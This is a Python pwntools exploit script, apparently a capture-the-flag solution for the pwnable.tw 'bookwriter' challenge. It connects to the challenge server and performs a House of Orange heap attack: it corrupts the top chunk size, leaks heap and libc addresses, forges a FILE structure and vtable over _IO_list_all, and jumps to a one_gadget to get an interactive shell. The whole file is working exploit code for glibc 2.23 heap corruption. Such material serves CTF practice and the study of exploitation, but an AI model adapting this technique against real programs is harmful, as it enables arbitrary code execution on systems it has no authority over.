#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./bookwriter_patched')
libc = ELF('./libc_64.so.6')
ld = ELF('./ld-2.23.so')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10304)

def intro(name):
    sa('Author :', name)

def add(sz, data):
    sa('Your choice :', '1')
    sa('Size of page :', str(sz))
    sa('Content :', data)

def show(idx):
    sa('Your choice :', '2')
    sa('Index of page :', str(idx))

def edit(idx, data):
    sa('Your choice :', '3')
    sa('Index of page :', str(idx))
    sa('Content:', data)

def print_info(c, name=None):
    sa('Your choice :', '4')
    ru('Author : ')
    auther = ru('\n')[:-1]
    ru('Page : ')
    page = ru('\n')[:-1]
    sla('Do you want to change the author ? (yes:1 / no:0) ', str(c))
    if c == 1:
        intro(name)
    return auther, page

# House of Orange: https://qianfei11.github.io/MyOldBlog/2020/04/25/House-of-All-in-One/#House-of-Orange
# leak heap & libc
intro('A' * 0x40)
add(0x18, 'A') # 0
edit(0, 'A' * 0x18)
edit(0, 'A' * 0x18 + '\xe1\x0f\x00') # change top chunk size
auther, page = print_info(0)
heap_base = uu64(auther[0x40:].ljust(8, '\x00')) - 0x10
info('heap_base = ' + hex(heap_base))
add(0x1000, 'B') # 1 <-- sysmalloc
add(0x500, 'C' * 8) # 2
show(2)
ru('Content :\n' + 'C' * 8)
libc_base = uu64(ru('\n')[:-1].ljust(8, '\x00')) - 0x3c4188
info('libc_base = ' + hex(libc_base))
if libc_base & 0xffffffff < 0x80000000:
    warning('LOWWORD(libc_base) < 0x80000000')
    p.close()
    exit(-1)
IO_list_all = libc_base + libc.sym['_IO_list_all']
info('IO_list_all = ' + hex(IO_list_all))

# overwrite sizes array
edit(0, '\x00')
for i in range(6):
    add(0x18, 'D')
#gdb.attach(p, 'x/gx 0x00000000006020E0')

# create a fake file struct (also a fake small bin)
fake_vtable = 0x0000000000602060
edit(0, '\x00' * 0x5e0 + up64(0) + up64(0x61) + up64(0) + up64(IO_list_all - 0x10) + up64(0) + up64(1) + '\x00' * 0xa8 + up64(fake_vtable) + up64(0))

# edit fake vtable
one_gagdets = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
one_gadget = libc_base + one_gagdets[3]
info('one_gadget = ' + hex(one_gadget))
print_info(1, '\x00' * 0x18 + up64(one_gadget))

#gdb.attach(p)
sa('Your choice :', '1')
sa('Size of page :', '1')

p.interactive()

